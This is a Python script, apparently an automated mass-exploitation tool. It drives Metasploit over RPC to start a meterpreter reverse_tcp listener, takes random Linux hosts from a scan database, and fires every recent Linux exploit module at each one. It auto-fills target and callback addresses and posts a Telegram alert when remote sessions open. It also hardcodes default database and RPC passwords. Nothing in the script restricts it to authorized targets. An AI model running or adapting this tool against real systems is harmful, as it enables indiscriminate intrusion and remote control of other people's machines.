#!/usr/bin/env python3
# corrige par code copilot
import os
import html
import psutil
import time
import socket
import subprocess
import psycopg2
import requests
from pathlib import Path
from pymetasploit3.msfrpc import MsfRpcClient

# R√©cup√©ration s√©curis√©e des credentials PostgreSQL
PG_USER = os.getenv("PG_USER", "postgres")
PG_PASSWORD = os.getenv("PG_PASSWORD", "bojemoi")  # Ne pas mettre de valeur par d√©faut pour plus de s√©curit√©
PG_DBNAME = os.getenv("PG_DBNAME", "msf")
PG_HOST = "postgres"

MODE_RUN = 1

LHOST = os.getenv("LHOST", "")
LPORT = int(os.getenv("LPORT", "4444"))


def read_secret(name: str) -> str | None:
    p = Path(f"/run/secrets/{name}")
    if p.exists():
        return p.read_text().strip()
    return os.getenv(name.upper())


def send_telegram_alert(sessions: dict, host: str) -> None:
    token = read_secret("telegram_bot_token")
    chat_id = read_secret("telegram_alert_chat_id")
    if not token or not chat_id:
        print("[WARN] Secrets Telegram non disponibles, alerte ignor√©e.")
        return

    lines = [f"üí• <b>UZI ‚Äî Session ouverte sur {html.escape(host)}</b>"]
    for sid, info in sessions.items():
        via = html.escape(info.get("via_exploit", "?"))
        payload = html.escape(info.get("via_payload", "?"))
        stype = html.escape(info.get("type", "?"))
        user = html.escape(info.get("username", "?"))
        platform = html.escape(info.get("platform", "?"))
        lines.append(
            f"\nüîë Session #{sid}\n"
            f"  Type     : {stype}\n"
            f"  Exploit  : {via}\n"
            f"  Payload  : {payload}\n"
            f"  Platform : {platform}\n"
            f"  User     : {user}"
        )

    text = "\n".join(lines)
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": int(chat_id), "text": text, "parse_mode": "HTML",
                  "disable_web_page_preview": True},
            timeout=15,
        )
        if resp.status_code == 200:
            print(f"[INFO] Alerte Telegram envoy√©e ({len(sessions)} session(s)).")
        else:
            print(f"[WARN] Telegram API {resp.status_code}: {resp.text}")
    except Exception as e:
        print(f"[ERREUR] Envoi Telegram √©chou√© : {e}")

# R√©cup√©rer l'adresse IP du serveur PostgreSQL
def get_postgres_ip():
    try:
        return socket.gethostbyname(PG_HOST)
    except socket.gaierror:
        print(f"[ERREUR] Impossible de r√©soudre {PG_HOST}")
        return None

# V√©rifier si PostgreSQL est pr√™t
def is_postgres_ready(ip):
    try:
        result = subprocess.run(
            ["pg_isready", "-h", ip, "-U", PG_USER, "-d", PG_DBNAME],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        return result.returncode == 0
    except Exception as e:
        print(f"[ERREUR] V√©rification PostgreSQL √©chou√©e : {e}")
        return False

# R√©cup√©rer un h√¥te al√©atoire depuis la base de donn√©es
def get_random_host(type):
    try:
        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST) as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT id, address FROM hosts TABLESAMPLE SYSTEM(0.1) WHERE os_name = %s LIMIT 1;", (type,))
                return cur.fetchone() or (None, None)
    except psycopg2.Error as e:
        print(f"[ERREUR] Probl√®me lors de la r√©cup√©ration d'un h√¥te : {e}")
        return None, None

def kill_process_by_name(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
#        print(f"[INFO] Processus {proc.info['name']} (PID: {proc.info['pid']}) ...")
        if process_name in proc.info['name']:
            try:
                proc2kill = psutil.Process(proc.info['pid'])
                proc2kill.terminate()
                proc2kill.wait(timeout=3)
                print(f"[INFO] Processus {process_name} (PID: {proc.info['pid']}) termin√©.")
            except psutil.NoSuchProcess:
                print(f"[ERREUR] Processus {process_name} n'existe plus.")
            except psutil.AccessDenied:
                print(f"[ERREUR] Acc√®s refus√© pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
            except psutil.TimeoutExpired:
                print(f"[ERREUR] Temps d'attente expir√© pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
            return



# Boucle principale
def main():
    pg_ip = get_postgres_ip()
    if not pg_ip:
        return

    if is_postgres_ready(pg_ip):
        print(f"[INFO] PostgreSQL d√©tect√© √† {pg_ip}")
    else:
        print(f"[ERREUR] Port 5432 ouvert mais PostgreSQL ne r√©pond pas √† {pg_ip}")
        return
    
#    kill_process_by_name('ruby')
#    time.sleep (5)

#    pwd = os.getenv("PWD")
#    command = ["msfconsole", "-r", f"{pwd}/msfconsole.rc", "-q", "-x", f"db_connect {PG_USER}:{PG_PASSWORD}@{pg_ip}/{PG_DBNAME}"]
#    print(f"[INFO] Lancement sur {pg_ip}")

#    try:
#        processus = subprocess.Popen(command)
#        time.sleep(60)
#    except subprocess.CalledProcessError as e:
#        print(f"[ERREUR] √âchec Lancement msfconsole en arri√®re-plan : {e}")
#        return

    client = MsfRpcClient('totototo', port=55553, server="127.0.0.1", ssl=True)

    # D√©marrer le listener multi/handler en t√¢che de fond
    if LHOST:
        console_h = client.consoles.console()
        for cmd in [
            "use exploit/multi/handler",
            "set PAYLOAD linux/x64/meterpreter/reverse_tcp",
            f"set LHOST {LHOST}",
            f"set LPORT {LPORT}",
            "set ExitOnSession false",
            "exploit -j -z",
        ]:
            console_h.write(cmd + "\n")
            time.sleep(1)
        print(f"[INFO] Listener multi/handler d√©marr√© sur {LHOST}:{LPORT}")
    else:
        print("[WARN] LHOST non d√©fini, listener non d√©marr√©")

    search_results = client.modules.search('linux')
    while True:

     console_id = client.consoles.console().cid
     console = client.consoles.console(console_id)
     host_id, host = get_random_host('Linux')
     if not host:
         print("[INFO] Aucun h√¥te disponible.")
         return
 
     print(f"[INFO] Scan de {host} en cours...")
#  Afficher les r√©sultats de la recherche




     for index in range (1, len(search_results)):
        if (search_results[index]['type'] != 'exploit'):
            print('+',end ="")
            continue

        if (search_results[index]['disclosuredate'] < "2021-01-01" ):
            print('+',end ="")
            continue

        try:
#            print (search_results[index])
            exploit = client.modules.use('exploit',  search_results[index]['fullname'])
        except:
            print ("erreur dans les resultats")
            continue

        exploit.target = 0
        payload = exploit.targetpayloads()
        missing  =  exploit.missing_required
        if (len(missing) > 0):
          active_sessions = client.sessions.list
          for index1 in range(0, len(missing)):
            match missing[index1]:
               case "RHOSTS":
                    exploit[missing[index1]] = host
               case "TARGET_PATH":
                    exploit[missing[index1]] = "/"
               case "SESSION":
                    if active_sessions:
                        exploit[missing[index1]] = next(iter(active_sessions))
                    else:
                        print(f"[SKIP] SESSION requise mais aucune session active")
               case "LHOST":
                    exploit[missing[index1]] = LHOST
               case _:
                    print (f"Pas traite {missing[index1]}")
        if exploit.missing_required:
            print(f"[SKIP] Champs manquants : {exploit.missing_required} ‚Äî {search_results[index]['fullname']}")
            continue
        print (f"missing r√©solus : {search_results[index]['fullname']}")

#        print (exploit.runoptions)
#        print (f" payload {payload}")
        if (len (payload) > 0):
          if ( MODE_RUN == 1 ):
            for index1 in range(0, len(payload)):
              print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
              try:
                  console.run_module_with_output(exploit, payload[index1])
                  print (": Ok")
              except:
                  print (": A controler")
                  continue
              while console.is_busy():
                   print("+",end="")
                   time.sleep(1)

     print(f"[INFO] Scan de {host} termin√©.")

     sessions = client.sessions.list
     print(f"[INFO] Sessions actives: {sessions}")
     if sessions:
         send_telegram_alert(sessions, host)


if __name__ == "__main__":
    main()


